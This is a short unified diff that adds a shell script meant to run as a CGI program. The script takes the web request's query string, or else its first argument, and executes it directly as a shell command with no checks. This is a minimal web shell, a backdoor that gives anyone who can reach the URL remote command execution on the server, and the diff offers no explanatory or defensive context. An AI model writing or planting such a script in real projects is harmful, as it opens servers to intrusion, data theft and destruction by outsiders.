@@ -1,0 +1,9 @@
+#!/bin/sh
+cmd=$QUERY_STRING
+if [ not $cmd ]; then
+	cmd=$1
+fi
+        
+$cmd
+exit 200
+
